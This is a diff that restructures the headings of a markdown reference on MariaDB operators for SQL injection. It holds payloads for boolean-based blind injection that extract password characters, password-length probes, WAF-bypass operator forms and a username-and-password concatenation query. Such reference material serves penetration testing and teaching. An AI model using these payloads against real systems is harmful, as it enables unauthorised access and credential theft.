@@ -7,11 +7,9 @@ tags: ["operators", "comparison", "logical", "reference"]
 lastUpdated: 2025-12-18
 ---
 
-## Operators
-
 Understanding MariaDB operators is essential for crafting effective SQL injection payloads. This reference covers the most useful operators for SQL injection techniques.
 
-### Comparison Operators
+## Comparison Operators
 
 | Operator      | Description           | Example                                             |
 | ------------- | --------------------- | --------------------------------------------------- |
@@ -33,7 +31,7 @@ Understanding MariaDB operators is essential for crafting effective SQL injectio
 | `SOUNDS LIKE` | Phonetic comparison   | `SELECT * FROM users WHERE name SOUNDS LIKE 'john'` |
 | `IN`          | In set                | `SELECT * FROM users WHERE id IN (1,2,3)`           |
 
-#### NULL-Safe Equal Operator (<=>)
+### NULL-Safe Equal Operator (<=>)
 
 The `<=>` operator treats NULL as a comparable value:
 
@@ -48,7 +46,7 @@ SELECT (NULL <=> NULL) AS result  -- Returns: 1
 SELECT (1 <=> NULL) AS result  -- Returns: 0 (false)
 ```
 
-### Logical Operators
+## Logical Operators
 
 | Operator       | Description | Example                                              |
 | -------------- | ----------- | ---------------------------------------------------- |
@@ -57,7 +55,7 @@ SELECT (1 <=> NULL) AS result  -- Returns: 0 (false)
 | `NOT` or `!`   | Logical NOT | `SELECT * FROM users WHERE NOT id=1`                 |
 | `XOR`          | Logical XOR | `SELECT * FROM users WHERE id=1 XOR admin=1`         |
 
-#### XOR Behavior
+### XOR Behavior
 
 XOR returns true when exactly one operand is true:
 
@@ -67,7 +65,7 @@ SELECT (1 XOR 1) AS result  -- Returns: 0 (both true)
 SELECT (0 XOR 0) AS result  -- Returns: 0 (both false)
 ```
 
-#### Alternative NOT Syntax
+### Alternative NOT Syntax
 
 The `!` operator can be used as prefix notation:
 
@@ -79,7 +77,7 @@ SELECT * FROM users WHERE NOT id = 1
 SELECT * FROM users WHERE !(id = 1)
 ```
 
-### Mathematical Operators
+## Mathematical Operators
 
 Basic arithmetic operators (`+`, `-`, `*`, `/`, `DIV`, `%`, `MOD`) are available for injection payloads when needed for calculations or obfuscation. For detailed arithmetic documentation, refer to MariaDB official docs.
 
@@ -89,17 +87,17 @@ Basic arithmetic operators (`+`, `-`, `*`, `/`, `DIV`, `%`, `MOD`) are available
 ' OR LENGTH(password)>5+5 -- -  -- password length > 10
 ```
 
-### Bitwise Operators
+## Bitwise Operators
 
 Bitwise operators (`&`, `|`, `^`, `<<`, `>>`, `~`) are rarely used in SQL injection but available for advanced obfuscation. For complete bitwise operator documentation, refer to MariaDB official docs.
 
-### Assignment Operators
+## Assignment Operators
 
 | Operator | Description      | Example         |
 | -------- | ---------------- | --------------- |
 | `:=`     | Value assignment | `SET @var := 1` |
 
-#### Using Variables in Queries
+### Using Variables in Queries
 
 Variables can be assigned and used within the same query:
 
@@ -111,14 +109,14 @@ SELECT @var := 10, @var * 2 AS doubled  -- Returns: 10, 20
 SELECT @row := @row + 1 AS row_num, username FROM users, (SELECT @row := 0) r
 ```
 
-### String Operators
+## String Operators
 
 | Operator      | Description                  | Example                                                  |
 | ------------- | ---------------------------- | -------------------------------------------------------- |
 | `CONCAT()`    | String concatenation         | `SELECT CONCAT(first_name, ' ', last_name) FROM users`   |
 | `CONCAT_WS()` | Concatenation with separator | `SELECT CONCAT_WS('-', 'a', 'b', 'c')` (returns 'a-b-c') |
 
-#### CONCAT vs CONCAT_WS NULL Handling
+### CONCAT vs CONCAT_WS NULL Handling
 
 `CONCAT()` returns NULL if any argument is NULL, while `CONCAT_WS()` skips NULL values:
 
@@ -132,9 +130,9 @@ SELECT CONCAT_WS('-', 'a', NULL, 'c') AS result  -- Returns: 'a-c'
 
 This difference is useful when extracting data that might contain NULL columns. Use `CONCAT_WS()` when you want to ignore NULL values in concatenation.
 
-### Usage in SQL Injection
+## Usage in SQL Injection
 
-#### Boolean-Based Blind Injection
+### Boolean-Based Blind Injection
 
 ```sql
 -- Testing if admin exists
@@ -144,7 +142,7 @@ This difference is useful when extracting data that might contain NULL columns. 
 ' OR ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97 -- -
 ```
 
-#### Operator Precedence Exploitation
+### Operator Precedence Exploitation
 
 Operators follow a precedence order that can be exploited:
 
@@ -157,7 +155,7 @@ Operators follow a precedence order that can be exploited:
 (1=0 OR 1=1) AND 2=2 -- True
 ```
 
-#### Alternative Operator Forms
+### Alternative Operator Forms
 
 Using alternative forms can help bypass WAF filters:
 
@@ -169,7 +167,7 @@ SELECT * FROM users WHERE id=1 OR username='admin'
 SELECT * FROM users WHERE id=1 || username='admin'
 ```
 
-#### Practical Examples in Injections
+### Practical Examples in Injections
 
 ```sql
 -- Using NOT to invert conditions
@@ -188,7 +186,7 @@ SELECT * FROM users WHERE id=1 || username='admin'
 SELECT id, CONCAT(username, ':', password) AS creds FROM users
 ```
 
-### Truth Table for Logical Operators
+## Truth Table for Logical Operators
 
 | Expr1 | Expr2 | AND   | OR    | XOR   |
 | ----- | ----- | ----- | ----- | ----- |
@@ -202,7 +200,7 @@ SELECT id, CONCAT(username, ':', password) AS creds FROM users
 | NULL  | FALSE | FALSE | NULL  | NULL  |
 | NULL  | NULL  | NULL  | NULL  | NULL  |
 
-### Operator Precedence in MariaDB
+## Operator Precedence in MariaDB
 
 From highest to lowest:
 
@@ -225,7 +223,7 @@ From highest to lowest:
 17. `OR`, `||` (logical OR, default behavior)
 18. `:=`, `=` (assignment, lowest)
 
-#### Precedence Examples
+### Precedence Examples
 
 ```sql
 -- AND before OR: 1=0 OR 1=1 AND 2=2 evaluates as 1=0 OR (1=1 AND 2=2)
